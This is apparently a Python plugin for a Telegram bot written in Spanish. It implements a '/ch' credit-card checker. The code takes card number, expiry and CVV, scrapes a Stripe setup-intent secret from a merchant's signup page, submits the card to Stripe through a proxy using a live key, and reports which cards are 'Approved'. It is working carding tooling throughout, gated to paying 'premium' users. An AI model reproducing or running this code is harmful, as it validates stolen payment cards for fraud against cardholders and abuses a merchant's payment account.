import json
import requests
import time
import asyncio
from colored import fg, bg, attr
from asyncio import sleep
from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
) 



from datos import idchat

@Client.on_message(filters.command(["ch"], ["/", "."]))
async def ch(_, message: Message):
    with open(file='plugins/usuarios/premium.txt',mode='r+',encoding='utf-8') as archivo:
        x = archivo.readlines()
        if str(message.from_user.id) + '\n' in x or message.chat.id in idchat:

            data = message.text.split(" ", 2)

            if len(data) < 2:
                await message.reply_text("<b>⎚ Usar <code>/ch card</code></b>")
                return

            ccs  = data[1]
            card = ccs.split("|")
            cc   = card[0]
            mes  = card[1]
            ano  = card[2]
            cvv  = card[3]
            bin_code = cc[:6]

            low_ano = lambda x: x[2:] if len(x) == 4 else x
            ano = low_ano(ano)

            gate = Gateways('Abigail', ccs)
            
            # REQUESTS INIT
            
            ttp_proxy  = "https://190.255.49.66:30393"

            proxies = { 
              "sock4"  : ttp_proxy,  
            }
#-----------------------------------------------------------------------------------------------
            session = requests.Session()
            req_1 = session.get('https://www.subbly.co/admin/auth/register', proxies=proxies).text
            #print(req_1)
            if 'Not allowed' in req_1:
                await message.reply_text(f"<b><code>{req_1}</code> Problemas de VPN estas unsando un vpn fuera de la estencion que usas como dominio.</b>")
            seti_secret = req_1.split("window.intent = '")[1].split("'")[0]
            seti = seti_secret.split("_secret_")[0]
            
            text = gate.initial_progress()
            mess = await message.reply_text(text)
            
            headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'es-ES,es;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'
            }

            data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]=juan+moltares&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]=14c4d026-6952-41fe-a710-01a7a366d17e4575d6&payment_method_data[muid]=66b0b062-ff6d-42f7-ae71-323cf9970d69e5c9e1&payment_method_data[sid]=a54abcfe-4809-4f9d-8f30-2b8c2280040181c17e&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Ff06870666%3B+stripe-js-v3%2Ff06870666&payment_method_data[time_on_page]=115132&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_rSL4eUmipHMkptbjal1vLN0F&client_secret={seti_secret}'

            response = session.post(f'https://api.stripe.com/v1/setup_intents/{seti}/confirm', headers=headers, data=data)

            text = gate.initial_progress(100)
            mess = await mess.edit_text(text)

            
            if 'three_d_secure_2_source' in response.text:
                text = gate.finish_progress('Approved 3D ✅')
                await mess.edit_text(text)
            elif 'generic_decline' in response.text:
                error = response.json()["error"]
                text = gate.finish_progress('Decline ❌', error['message'])
                await mess.edit_text(text)
            elif 'succeeded' in response.text:
                error = 'Approved ✅'
                text = gate.finish_progress('Approved ✅',error)
                await mess.edit_text(text)

            elif 'insufficient_funds' in response.text:
                
                error = response.json()["error"]
                text = gate.finish_progress('Approved ✅', error['message'])
                await mess.edit_text(text)
            elif 'incorrect_cvc' in response.text:
                error = response.json()["error"]
                text = gate.finish_progress(error["message"] + "✅", error['code'])
                await mess.edit_text(text)
            elif 'error' in response.text:
                error = response.json()["error"]
                text = gate.finish_progress(error["message"] + "❌", error['code'])
                await mess.edit_text(text)
            else:
                text = gate.finish_progress('Unknown ❌')
                await mess.edit_text(text)
        else:
            return await message.reply(f'<b>⎚ Chat no autorizado | O no eres Premium.</b>')